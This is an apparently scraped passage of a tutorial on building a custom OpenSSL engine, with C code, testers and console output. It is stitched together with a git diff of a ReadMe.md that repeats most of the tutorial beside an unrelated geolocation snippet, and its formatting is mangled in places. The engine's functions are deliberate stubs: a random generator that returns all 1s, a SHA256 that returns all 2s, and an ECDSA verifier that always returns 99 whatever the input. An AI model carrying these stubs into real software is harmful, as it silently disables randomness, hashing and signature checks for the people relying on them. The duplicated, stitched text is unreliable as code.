FILE* fp = fopen("./ownPrivkey.pem", "r"); if (fp == NULL) { printf( "Could not open private key file\N"); exit(1); } EVP_PKEY *privateKey; privateKey= PEM_read_PrivateKey(fp, NULL, 0, NULL); if ((privateKey) == NULL) { printf("Could not extract private key from file\N"); exit(1); } fclose(fp);

EC_KEY *eckey; eckey = EC_KEY_new(); ECDSA_SIG * ecdsa_sig; ecdsa_sig = ECDSA_SIG_new(); eckey = EVP_PKEY_get1_EC_KEY(privateKey);

EC_GROUP ec_group; ec_group = EC_GROUP_new_by_curve_name(NID_brainpoolP384r1); const EC_POINT pub_key; pub_key = EC_KEY_get0_public_key(eckey);

unsigned char agreed_value[200]; EC_KEY *ecdh; ecdh = EC_KEY_new(); EC_KEY_set_group(ecdh, ec_group); er = EC_KEY_set_private_key(ecdh, EC_KEY_get0_private_key(eckey));

int agreed_value_len = ECDH_compute_key(agreed_value, 200,pub_key, ecdh, NULL);

printf("Oezgan engine Agreed Value: %d\n",agreed_value_len); for(int i= 0; i < agreed_value_len; i++) { printf("%x", agreed_value[i]); } printf("\n"); Running the tester results in: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 ENGINE SETTING DEFAULT DIGESTS 1 initialized! SHA256 Digest INIT 1 SHA256 update Digest Update 1 SHA256 final size of EVP_MD: 76 SHA256 cleanup Digest Final 1 Digest size:32 22222222222222222222222222222222 ENGINE SETTING DEFAULT ECDH: 1 Oezgan Engine ECDH Method Oezgan engine ECDH method End returning: 97! Oezgan engine Agreed Value: 97 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 ECDSA

Now we implement our own ECDSA Algorithm in our engine. Similar to ECDH we need to copy a definition of the ECDSA Method structure. This method structure is found in the crypto/ecdsa/ecs_locl.h file. The Structure: struct ecdsa_method { const char *name; ECDSA_SIG *(*ecdsa_do_sign) (const unsigned char *dgst, int dgst_len, EC_KEY *eckey); int (*ecdsa_sign_setup) (EC_KEY *eckey, BN_CTX *ctx, BIGNUM **kinv, BIGNUM **r); int (*ecdsa_do_verify) (const unsigned char *dgst, int dgst_len, const ECDSA_SIG *sig, EC_KEY *eckey);

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
void *app_data;
}; We add this declaration into the oezganEngine.h file. The complete .h file is shown below: #ifndef OEZGANENGINE_H_ #define OEZGANENGINE_H_

#ifdef __cplusplus extern "C" { #endif

struct ecdh_method { const char *name; int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key, EC_KEY *ecdh, void *(*KDF) (const void *in, size_t inlen, void *out, size_t *outlen));

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
char *app_data;
};

struct ecdsa_method { const char *name; ECDSA_SIG *(*ecdsa_do_sign) (const unsigned char *dgst, int dgst_len, EC_KEY *eckey); int (*ecdsa_sign_setup) (EC_KEY *eckey, BN_CTX *ctx, BIGNUM **kinv, BIGNUM **r); int (*ecdsa_do_verify) (const unsigned char *dgst, int dgst_len, const ECDSA_SIG *sig, EC_KEY *eckey);

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
void *app_data;
}; As we can see the ECDSA method structure needs at least 3 functions, the setup function the signing function and the verifying function. Similar to the ECDH section we define our methods in our oezganEngine.c file: static ECDSA_METHOD oezgan_engine_ecdsa_method = { "Oezgan engine ECDSA method", oezgan_engine_ecdsa_sign, oezgan_engine_ecdsa_sign_setup, oezgan_engine_ecdsa_do_verify,

if 0

    NULL,                       /* init */
    NULL,                       /* finish */
endif

    0,                          /* flags */
    NULL                        /* app_data */
} We also add our signing, verifying and setup functions to the oezganEngine.c file: int oezgan_engine_ecdsa_sign_setup (EC_KEY *eckey, BN_CTX *ctx_in, BIGNUM **kinvp, BIGNUM **rp) { return 1; } static ECDSA_SIG *oezgan_engine_ecdsa_sign (const unsigned char *dgst, int dgst_len, const BIGNUM *kinv, const BIGNUM *rp, EC_KEY *in_eckey) { printf("oezgan engine ecdsa sign digest \n"); unsigned char * out_sig; out_sig = malloc(sizeof(unsigned char)64); int sig_len = 0; //convert privatekey int pkeyLen = i2d_ECPrivateKey(in_eckey,NULL); const BIGNUM bignum = EC_KEY_get0_private_key(in_eckey); int pkeyLen; unsigned char *ucBuf, *uctempBuf; pkeyLen = BN_bn2mpi(bignum, NULL); ucBuf = (unsigned char *)malloc(pkeyLen+1); uctempBuf = ucBuf; //Note that this function modifies the uctempBuf as // uctempBuf = uctempBuf + pkeyLen BN_bn2mpi(bignum, uctempBuf); memset(ucBuf,4,pkeyLen); sig_len = pkeyLen;

ECDSA_SIG * ret_sig;
ret_sig = d2i_ECDSA_SIG(NULL,&out_sig,sig_len);
out_sig -= sig_len;
return ret_sig;
}

int oezgan_engine_ecdsa_do_verify (const unsigned char *digest, int digest_len, const ECDSA_SIG *ecdsa_sig, EC_KEY *eckey) { printf("oezgan engine verifying function\n"); int res = 0; int er = 0; //convert ECDSA_SIG to unsigned char int sig_len = i2d_ECDSA_SIG(ecdsa_sig,NULL); unsigned char * sign = malloc(sizeof(unsigned char)*sig_len); er = i2d_ECDSA_SIG(ecdsa_sig,&sign); sign -= sig_len;

//convert EC_Key to unsigned char

int pubkey_len = i2o_ECPublicKey(eckey,NULL);
unsigned char* pubkey = malloc(sizeof(unsigned char)*pubkey_len);
er = i2o_ECPublicKey(eckey,&pubkey);
pubkey -= er;
if(er == 0) {
    printf("\n Could not convert EC_KEY error:%d\n",er);
    return er;
}
res =99;
printf("oezgan ecdsa verfiy end! result %d\n",res);
return res;
} Our setup function does basically nothing. It always returns 1. You can also use the default implementation of the ECDSA sign setup method located in the file crypto/ecdsa/ecs_ossl.c in the source directory of OpenSSL. We can’t do much in our signing function without a proper signing algorithm, since the return value type ECDSA_SIG needs to be a DER encoded elliptic curve digital signature which consists of a pair (r,s). Therefore our ecdsa implementation returns 0 as the size of the signature and no signature at all. The verifying function always returns 99 independent of the data provided. The conversions in these methods are made for demonstration purposes, to give the reader a rough idea about implementing his or her own algorithms. List of conversions done: Finally we modify our bind_helper function again as follows: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) || !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method) || !ENGINE_set_ECDSA(e, &oezgan_engine_ecdsa_method) ) return 0; return 1;+ } To test this we also need a certificate file noted here as “ownCert.pem”. Then we add the following lines to our test program:

er = ENGINE_set_default_ECDSA(oezgan_engine);
printf("\nENGINE SETTING DEFAULT ECDSA:%d\n",er);

unsigned char *sig = new unsigned char[256];
unsigned int sigsize;
ECDSA_sign(0,digest,digestSize,sig,&sigsize,eckey);
printf("Signature size:%d \n",sigsize);
for(int i=0; i <sigsize;i++) {
    printf("%x",sig[i]);
}
printf("\n");
printf("Now verifying!\n");

BIO* bio_in;
bio_in = BIO_new_file("./ownCert.pem", "r");
if (bio_in == NULL) {
    printf("could not read public key file\n");
    exit(1);

}
X509 *certificate;
certificate = X509_new();
if (PEM_read_bio_X509(bio_in, &certificate, 0, NULL) == NULL) {
    printf("could not read  certificate from public key file\n");
    exit(1);
}
EVP_PKEY *pubKey;
pubKey = X509_get_pubkey(certificate);
EC_KEY* eckey_pub;
eckey_pub = EVP_PKEY_get1_EC_KEY(pubKey);

int result = ECDSA_do_verify(digest, digestSize,
        ecdsa_sig, eckey_pub);
printf("Verify result %d\n", result);
The resulting output is: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 ENGINE SETTING DEFAULT DIGESTS 1 initialized! SHA256 Digest INIT 1 SHA256 update Digest Update 1 SHA256 final size of EVP_MD: 76 SHA256 cleanup Digest Final 1 Digest size:32 22222222222222222222222222222222 ENGINE SETTING DEFAULT ECDH: 1 ENGINE SETTING DEFAULT ECDSA:1 Oezgan Engine ECDH Method Oezgan engine ECDH method End returning: 97! Oezgan engine Agreed Value: 97 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 oezgan engine ecdsa sign digest 427abc1d0cb9498d5828fc228e3350da674afab9981f5b7c99c5ee1856e83379b89fa6566bf90144f955a2de1973b22138277efd8117e70c636dee84b3592b15b2abf479c7b1fa5db86f35d93fca1d918bbdcf815a82fd44b515cb58942

Signature size:0

Now verifying! oezgan engine verifying function oezgan ecdsa verfiy end! result 99 Verify result 99 Note about the ECDSA_METHOD structure

Instead of putting the definition of the ECDSA_METHOD in the header file we can alternatively use the build-in OpenSSL methods for acquiring the method structure. Actually this is encouraged with OpenSSL versions >= 1.0.2. This is done as follows: static ECDSA_METHOD *oezgan_engine_ecdsa_method = NULL

static int setup_ecdsa_method(void) { oezgan_engine_ecdsa_method = ECDSA_METHOD_new(NULL); if (oezgan_engine_ecdsa_method == NULL) return 0;

    ECDSA_METHOD_set_name(oezgan_engine_ecdsa_method, "Oezgan engine ECDSA method");
    ECDSA_METHOD_set_sign(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_sign);
    ECDSA_METHOD_set_sign_setup(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_sign_setup);
    ECDSA_METHOD_set_verify(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_do_verify);
return 1;
}
and then in the bind_helper we have to do something like this: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !setup_ecdsa_method() || !ENGINE_set_ECDSA(e, oezgan_engine_ecdsa_method) ) return 0; return 1; } This is probably the smoother way to go. Using C++ Implementations

In our engine implementation of random generation, sha256, ECDH and ECDSA we used strict C methods. In practice however it is easier to implement elliptic curve functionality in C++; at least this is the author’s perception. Let’s assume that we have some elliptic curve and sha256 implementation in C++. How can we use this implementation as an engine in OpenSSL? Consider the following diagram. Wrapper.png The engine is implemented in pure C; the wrapper which is kind of an interface to the C++ implementation is also implemented in C++. The header of the wrapper provides the engine with the necessary methods to be called; these are declared as extern c functions and have a C method signature. The actual implementations of these extern C functions can include C++ syntax and types. From these functions we use the C++ implementation of the elliptic curve libraries. The wrapper should be compiled a static library together with the elliptic curve C++ implementation. The engine is implemented in pure C; the wrapper which is kind of an interface to the C++ implementation is also implemented in C++. The header of the wrapper provides the engine with the necessary methods to be called; these are declared as extern c functions and have a C method signature. The actual implementations of these extern C functions can include C++ syntax and types. From these functions we use the C++ implementation of the elliptic curve libraries. The wrapper should be compiled a static library together with the elliptic curve C++ implementation. Here is a simple with the random function. The wrapper.h file: #ifndef WRAPPER_H_ #define WRAPPER_H_

#ifdef __cplusplus extern "C" { #endif extern void getRandomBytes_C(unsigned char* buffer, int length); #ifdef __cplusplus }

#endif #endif /* WRAPPER_H_ */

And the wrapper.c file: #include <stdio.h> #include <string.h> #include #include #include #include "wrapper.h"

using namespace std; typedef unsigned char byte; typedef std::vector ByteVector;

void getRandomBytes_C(unsigned char* buffer, int numBytes) { string str = "oezgan engine wrapper getRandomBytes C++ method"; cout << str << "\n"; string fileName = "/dev/urandom"; ByteVector result; std::ifstream inFile(fileName.c_str());

std::filebuf* fileBuf = inFile.rdbuf();
result.resize(numBytes);
fileBuf->sgetn(reinterpret_cast<char*>(&result[0]), numBytes);
inFile.close();
memcpy(buffer,&result[0],numBytes);
} When we modify the Engine.c file as: //new include #include "wrapper.h"

int get_random_bytes(unsigned char *buf, int num) { printf("oezgan engine random length %d\n", num); getRandomBytes_C(buf, num); return 99; } Note that the engine should be compiled with the -Wl,-whole-archive -lwrapper -Wl,-no-whole-archive linker flag, such that the wrapper is completely included in the engine. In eclipse you can define an environment variable for that. To add the whole archive flag in eclipse you can go to Project->Properties->C/C++ Build->Enviroment And add a new environment variable WHOLELIB with the value: -Wl,-whole-archive -lwrapper -Wl,-no-whole-archive After that, go to:

Project->Properties->C/C++ Build->Setting->Tool Settings-> GCC C Linker and add under expert settings at the end of the command line pattern (with an empty space between) ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 oezgan engine wrapper getRandomBytes C++ method dea695abdf … As you can see the C++ random generation method is used, for other methods you can use a similar approach.

ReadMe.md | 773 +++++++++++++++++++++++++++++++++++++++++++++++++++++- 1 file changed, 772 insertions(+), 1 deletion(-)

diff --git a/ReadMe.md b/ReadMe.md index 3997774..613093a 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -4792,6 +4792,777 @@ function geoFindMe() { navigator.geolocation.getCurrentPosition(success, error); } } +sudo ln –s ~/workspace/oezganEngine/Debug/liboezganengine.so liboezgan.so +You can also copy the compiled shared library into the /usr/lib/engines/ directory but this should be done when the engine is ready to be deployed.You can find the OpenSSL include files in /usr/include/openssl. +Beginning + +We will start with implementing an engine which only has its name and nothing else. The oezganEngine.c file: +#include <openssl/engine.h> +static const char *engine_oezgan_id = "oezgan"; +static const char *engine_oezgan_name = "oezgan engine by Fraunhofer FKIE"; + +IMPLEMENT_DYNAMIC_CHECK_FN(); +IMPLEMENT_DYNAMIC_BIND_FN(bind_helper); + +int oezgan_init(ENGINE *e) {

printf("Oezgan Engine Initializatzion!\n");
return 786; +}
+int bind_helper(ENGINE * e, const char *id) +{

if (!ENGINE_set_id(e, engine_oezgan_id) ||
       !ENGINE_set_name(e, engine_oezgan_name) ||
       !ENGINE_set_init_function(e,oezgan_init)
)
   return 0;
return 1; +}
+and the tester oezganEngineTester.cc file: +#include <openssl/engine.h> +#include <stdio.h> +#include <string.h> + +int main(int argc, const char* argv[] ) {

OpenSSL_add_all_algorithms();
ERR_load_crypto_strings();
ENGINE_load_dynamic();
ENGINE *oezgan_engine = ENGINE_by_id("oezgan");
if( oezgan_engine == NULL )
{
   printf("Could not Load Oezgan Engine!\n");
   exit(1);
}
printf("Oezgan Engine successfully loaded\n");
int init_res = ENGINE_init(oezgan_engine);
printf("Engine name: %s init result : %d \n",ENGINE_get_name(oezgan_engine), init_res);
return 0; +}
+Note that we use a c++ file to test the engine. Running the tester gives us the following result: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +Our engine is successfully loaded and when it`s asked it gives back its name. Now we proceed by implementing our own random function. +Cleanup memory leaks +For OpenSSL version prior to 1.1.0, users are required to call ENGINE_cleanup, EVP_cleanup, etc. to prevent memory leak. See Library Initialization page. +For OpenSSL version 1.1.0 and 1.1.1, cleanup happens automatically, users should not worry about it. +ENGINE_set_finish_function & ENGINE_set_destroy_function are still available to do implementation specific cleanup. +The Random Function + +OpenSSL has its own method declarations which our engine has to comply with. In the header file ossl_typ.h we find the declaration s: +typedef struct rand_meth_st RAND_METHOD; +typedef struct ecdh_method ECDH_METHOD; +typedef struct ecdsa_method ECDSA_METHOD; +For now we are only interested in the RAND_METHOD declaration. The RAND_METHOD declaration is actually a macro for the rand_method_st declaration which can be found in rand.h of the OpenSSL includes. Here we see that the rand_method_st has the following format: +struct rand_meth_st {

void (*seed) (const void *buf, int num);
int (*bytes) (unsigned char *buf, int num);
void (*cleanup) (void);
void (*add) (const void *buf, int num, double entropy);
int (*pseudorand) (unsigned char *buf, int num);
int (*status) (void); +}; +Thus we see that the OpenSSL random method structure defines six functions where the headers of these functions have specific formats. For simplicity purposes we will only implement the “bytes” and the “status” methods. The status method should return an integer and takes no arguments. Presumably this method is used for indication of the state of the random machine. Our engine`s random machine has no states, therefore we only return a positive integer to indicate a thumbs up state. The random status method: +int oezgan_random_status(void) +{
return 1; +} +Now we implement our own method for generating a number of random bytes as follows: +//new includes +#include <string.h> +#include <openssl/ossl_typ.h>
+int get_random_bytes(unsigned char *buffer, int num) {

printf("oezgan engine random length %d\n", num);
memset(buffer,1,num);
return 99; +} +This method will fill the given buffer with num many ones. Now we indicate our random machine structure as: +RAND_METHOD oezgan_random_method = {
   NULL,                       /* seed */
   get_random_bytes,
   NULL,                       /* cleanup */
   NULL,                       /* add */
   NULL,
   oezgan_random_status
+}; +We also modify the bind_helper function from above: +int bind_helper(ENGINE * e, const char *id) +{

if (!ENGINE_set_id(e, engine_oezgan_id) ||
   !ENGINE_set_name(e, engine_oezgan_name) ||
   !ENGINE_set_init_function(e, oezgan_init) ||
   !ENGINE_set_RAND(e, &oezgan_random_method)
           )
   return 0;
return 1; +} +In the tester we add the following lines: +ENGINE_set_default_RAND(oezgan_engine);
+unsigned char * rand_buf= new unsigned char[5]; +int err = RAND_bytes(rand_buf,5); +for(int i= 0; i < 5; i++) {

printf("%x",rand_buf[i]); +} +printf("\n"); +free(rand_buf); +The result is seen below: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +11111 +We now successfully implemented an OpenSSL engine that gives always returns a lot of 1s as random values. +Digests
+Now we want OpenSSL not only to use our own random function but also to use our sha2 family hash functions. We first implement a digest selector function, which tells OpenSSL which digests are available in our engine. This kind of implementation is adapted from the OpenSSL`s build-in engine ccghost. We will implement only one hash function namely SHA256. Following the the ossl_typ.h header to the evp.h header one can see that the Message Digest Structure is defined as follows: +struct env_md_st {

int type;
int pkey_type;
int md_size;
unsigned long flags;
int (*init) (EVP_MD_CTX *ctx);
int (*update) (EVP_MD_CTX *ctx, const void *data, size_t count);
int (*final) (EVP_MD_CTX *ctx, unsigned char *md);
int (*copy) (EVP_MD_CTX *to, const EVP_MD_CTX *from);
int (*cleanup) (EVP_MD_CTX *ctx);
/* FIXME: prototype these some day */
int (*sign) (int type, const unsigned char *m, unsigned int m_length,
            unsigned char *sigret, unsigned int *siglen, void *key);
int (*verify) (int type, const unsigned char *m, unsigned int m_length,
              const unsigned char *sigbuf, unsigned int siglen,
              void *key);
int required_pkey_type[5]; /* EVP_PKEY_xxx */
int block_size;
int ctx_size; /* how big does the ctx->md_data need to be */
/* control function */
int (*md_ctrl) (EVP_MD_CTX *ctx, int cmd, int p1, void p2); +} / EVP_MD */ ; +(Commentaries are original form OpenSSL code). From this we use our own message digest hash SHA256 declaration: +static EVP_MD oezgan_engine_sha256_method= {
   NID_sha256,
   NID_undef,
   32,
   EVP_MD_FLAG_PKEY_METHOD_SIGNATURE,
   oezgan_engine_sha256_init,
   oezgan_engine_sha256_update,
   oezgan_engine_sha256_final,
   oezgan_engine_sha256_copy,
   oezgan_engine_sha256_cleanup,
   /* FIXME: prototype these some day */
   NULL,
   NULL,
   {NID_undef, NID_undef, 0, 0, 0},
   64, /*Block Size*/
   32, /* how big does the ctx->md_data need to be */
   /* control function */
   NULL,
+} ; +SHA256 uses a block size of 512 Bit = 64 byte and resulting digest is 256 Bit = 32 byte long. You can also use your own block size and outcome size but for a realistic approach we stick to the original sha256 standard. Now we need to implement the init, update, final and copy functions for our own sha256 implementation. In our implementation the SHA256 Value is always 2222… +Note +Since 1.1.0, EVP_MD cannot be directly accessed. Users have to call EVP_MD_meth_new to get EVP_MD instance, and use EVP_MD_meth_set_* to set functions and properties list above. +OID and NID +In above example, we reused sha256's nid. For those who want to implement new algorithms, use OBJ_create to create new nid and OBJ_*2nid to translate names to nids. +static int oezgan_engine_sha256_init(EVP_MD_CTX *ctx) {

ctx->update = &oezgan_engine_sha256_update;
printf("initialized! SHA256\n");
return 1; +}
+static int oezgan_engine_sha256_update(EVP_MD_CTX *ctx,const void *data,size_t count) +{

printf("SHA256 update \n");
unsigned char * digest256 = (unsigned char*) malloc(sizeof(unsigned char)*32);
memset(digest256,2,32);
count = 32;
ctx->md_data = digest256;
return 1; +}
+static int oezgan_engine_sha256_final(EVP_MD_CTX *ctx,unsigned char *md) {

printf("SHA256 final size of EVP_MD: %d\n", sizeof(EVP_MD));
memcpy(md,(unsigned char*)ctx->md_data,32);
return 1; +}
+int oezgan_engine_sha256_copy(EVP_MD_CTX *to, const EVP_MD_CTX *from) +{

printf("Copy SHA256\n");
if (to->md_data && from->md_data) {
   memcpy(to->md_data, from->md_data,sizeof(from->md_data));
}
return 1; +}
+static int oezgan_engine_sha256_cleanup(EVP_MD_CTX *ctx) {

printf("SHA256 cleanup\n");
if (ctx->md_data)
   memset(ctx->md_data, 0, 32);
return 1; +} +Now we have to tell OpenSSL that whenever a SHA256 digest is requested use the engine implementation of sha256 this will be the digest selector function. +static int oezgan_digest_ids[] = {NID_sha256};
+static int oezgan_engine_digest_selector(ENGINE *e, const EVP_MD **digest,

   const int **nids, int nid) {
int ok = 1;
if (!digest) {
   *nids = oezgan_digest_ids;
   printf("\n Digest is empty! Nid:%d\n", nid);
   return 2;
}
printf("Digest no %d requested\n",nid);
if (nid == NID_sha256) {
   *digest = &oezgan_engine_sha256_method;
}
else {
   ok = 0;
   *digest = NULL;
}
return ok; +} +We also need to modify the bind_helper function again: +int bind_helper(ENGINE * e, const char *id) +{
if (!ENGINE_set_id(e, engine_oezgan_id) ||
   !ENGINE_set_name(e, engine_oezgan_name) ||
   !ENGINE_set_RAND(e, &oezgan_random_method) ||
   !ENGINE_set_init_function(e, oezgan_init) ||
   !ENGINE_set_digests(e, &oezgan_engine_digest_selector)
)
   return 0;
return 1; +} +And we modify our tester to generate us a SHA256 Hash function.
char * str = "Fraunhofer FKIE Wachtberg!";
int str_len = 26;
int er = ENGINE_set_default_digests(oezgan_engine);
printf("ENGINE SETTING DEFAULT DIGESTS %d\n",er);
unsigned char * digest = new unsigned char[32];
unsigned int digestSize = -1;
EVP_MD_CTX *evp_ctx;
evp_ctx = EVP_MD_CTX_create();
er = EVP_DigestInit_ex(evp_ctx, EVP_sha256(),oezgan_engine);
printf("Digest INIT %d\n",er);
er = EVP_DigestUpdate(evp_ctx, (unsigned char*)str, str_len);
printf("Digest Update %d\n",er);
er = EVP_DigestFinal(evp_ctx, digest, &digestSize);
printf("Digest Final %d Digest size:%d\n",er,digestSize);
for(int i= 0; i< digestSize; i++) {
   printf("%x", digest[i]);
}
printf("\n");
EVP_MD_CTX_destroy(evp_ctx); +The result is: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +11111 +ENGINE SETTING DEFAULT DIGESTS 1 +initialized! SHA256 +Digest INIT 1 +SHA256 update +Digest Update 1 +SHA256 final size of EVP_MD: 76 +SHA256 cleanup +Digest Final 1 Digest size:32 +22222222222222222222222222222222 +Similarly one can also implement other digest functions. Now we move on to more complicated things like the ECDSA or the ECDH algorithms. +ECDH
+We now want to use our own Elliptic Curve Diffie-Hellman Key Agreement function. This is a little bit different from what we have seen above. We get us the definition of the ECDH method structe from the file crypto/ecdh/ecdh.h the definition which is provided in this file is not included in the OpenSSL headers, therefore we have to put it in a new header file which will be included in our engine. +The file oezganEngine.h: +#ifndef OEZGANENGINE_H_ +#define OEZGANENGINE_H_ +#ifdef __cplusplus +extern "C" { +#endif + +struct ecdh_method {

const char *name;
int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key,
                   EC_KEY *ecdh, void *(*KDF) (const void *in,
                                               size_t inlen, void *out,
                                               size_t *outlen));
+# if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey); +# endif
int flags;
char *app_data; +};
+#ifdef _cplusplus +} +#endif + + +#endif /* OEZGANENGINE_H */ +KDF is the Key Derivation Function which will be NULL here. Now we add the following declaration in to our oezganEngine.c file: +ECDH_METHOD oezgan_ecdh_method = {

   "Oezgan Engine ECDH Method",
   oezgan_engine_compute_ecdh_key,
+# if 0

   NULL,
   NULL,
+# endif

   0,
   NULL,
+}; +And the implementation of the ECDH method: +static int oezgan_engine_compute_ecdh_key(void * key, size_t outlen, const EC_POINT *pubkey,

   EC_KEY *eckey, void *(*oezgan_ecdh_kdf) (const void *in, size_t inlen, void *out,
           size_t *outlen)) {
printf("Oezgan Engine ECDH Method\n");
EC_GROUP *group = EC_KEY_get0_group(eckey);
//convert pubkey
int pubkey_len = EC_POINT_point2oct(group, pubkey,
                       POINT_CONVERSION_UNCOMPRESSED,
                         NULL, 0, NULL);
unsigned char * pubkey_buf = malloc(sizeof(unsigned char)*pubkey_len);
pubkey_len = EC_POINT_point2oct(group, pubkey,
                       POINT_CONVERSION_UNCOMPRESSED,
                        pubkey_buf, pubkey_len, NULL);
//convert private key
const BIGNUM* prikey_bn = BN_new();
prikey_bn = EC_KEY_get0_private_key(eckey);
int privkey_len = BN_num_bytes(prikey_bn);
unsigned char * privkey_buf = malloc(sizeof(unsigned char)*privkey_len);
BN_bn2bin(prikey_bn, privkey_buf);
memset(key,3,pubkey_len);
outlen = pubkey_len;
free(privkey_buf);
free(pubkey_buf);
printf("Oezgan engine ECDH method End returning: %d!\n", outlen);
return outlen; +} +Our implementation of the ECDH Method copies the public key into an unsigned char array pubkey also the private key is converted into an unsigned char array for demonstration purposes since a real ECDH implementation has to calculate the from the values bP = B and aP=A the value abP where a and b are the secret keys of two users Aylin and Boris respectively and P is the base point on the elliptic curve. Again we modify our bind_helper method as follows: +int bind_helper(ENGINE * e, const char *id) +{
if (!ENGINE_set_id(e, engine_oezgan_id) ||
   !ENGINE_set_name(e, engine_oezgan_name) ||
   !ENGINE_set_RAND(e, &oezgan_random_method) ||
   !ENGINE_set_init_function(e, oezgan_init) ||
   !ENGINE_set_digests(e, &oezgan_engine_digest_selector) ||
   !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method)
)
   return 0;
return 1; +} +To be able to test this we need a certificate file and the corresponding private key file. There are many guides in the internet how to generate such certificates and private key pairs. Later on we will need that certificate file to test our ECDSA methods. The test program will now read in a private key file “ownPrivkey.pem” and try to establish an ECDH key with its own public key. The result will be a lot of 3s, exactly as many as the length of the public key. In our certificate file we use a brainpoolP384r1 curve as well as for the ECDH. Beware that the brainpool curves are not supported in OpenSSL versions < 1.0.2. You can use default NIST Curves such as the secp384r1 instead. The following is added to the tester: +//includes
#include <openssl/engine.h>
#include <openssl/crypto.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <stdio.h>
#include <string.h>
er = ENGINE_set_default_ECDH(oezgan_engine);
printf(" %d\N ",er);
FILE* fp = fopen("./ownPrivkey.pem", "r");
if (fp == NULL) {
  printf( "Could not open private key file\N");
  exit(1);
}
EVP_PKEY *privateKey;
privateKey= PEM_read_PrivateKey(fp, NULL, 0, NULL);
if ((privateKey) == NULL) {
 printf("Could not extract private key from file\N");
 exit(1);
}
fclose(fp);
EC_KEY *eckey;
eckey = EC_KEY_new();
ECDSA_SIG * ecdsa_sig;
ecdsa_sig = ECDSA_SIG_new();
eckey = EVP_PKEY_get1_EC_KEY(privateKey);
EC_GROUP *ec_group;
ec_group = EC_GROUP_new_by_curve_name(NID_brainpoolP384r1);
const EC_POINT* pub_key;
pub_key = EC_KEY_get0_public_key(eckey);
unsigned char agreed_value[200];
EC_KEY *ecdh;
ecdh = EC_KEY_new();
EC_KEY_set_group(ecdh, ec_group);
er = EC_KEY_set_private_key(ecdh, EC_KEY_get0_private_key(eckey));
int agreed_value_len = ECDH_compute_key(agreed_value, 200,pub_key, ecdh, NULL);
printf("Oezgan engine Agreed Value: %d\n",agreed_value_len);
for(int i= 0; i < agreed_value_len; i++) {
   printf("%x", agreed_value[i]);
}
printf("\n"); +Running the tester results in: +oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +11111 +ENGINE SETTING DEFAULT DIGESTS 1 +initialized! SHA256 +Digest INIT 1 +SHA256 update +Digest Update 1 +SHA256 final size of EVP_MD: 76 +SHA256 cleanup +Digest Final 1 Digest size:32 +22222222222222222222222222222222 +ENGINE SETTING DEFAULT ECDH: 1 +Oezgan Engine ECDH Method +Oezgan engine ECDH method End returning: 97! +Oezgan engine Agreed Value: 97 +3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 +ECDSA
+Now we implement our own ECDSA Algorithm in our engine. Similar to ECDH we need to copy a definition of the ECDSA Method structure. This method structure is found in the crypto/ecdsa/ecs_locl.h file. The Structure: +struct ecdsa_method {

const char *name;
ECDSA_SIG *(*ecdsa_do_sign) (const unsigned char *dgst, int dgst_len,
                            EC_KEY *eckey);
int (*ecdsa_sign_setup) (EC_KEY *eckey, BN_CTX *ctx, BIGNUM **kinv,
                        BIGNUM **r);
int (*ecdsa_do_verify) (const unsigned char *dgst, int dgst_len,
                       const ECDSA_SIG *sig, EC_KEY *eckey);
+# if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey); +# endif
int flags;
void *app_data; +}; +We add this declaration into the oezganEngine.h file. The complete .h file is shown below: +#ifndef OEZGANENGINE_H_ +#define OEZGANENGINE_H_
+#ifdef __cplusplus +extern "C" { +#endif + +struct ecdh_method {

const char *name;
int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key,
                   EC_KEY *ecdh, void *(*KDF) (const void *in,
                                               size_t inlen, void *out,
                                               size_t *outlen));
+# if 0

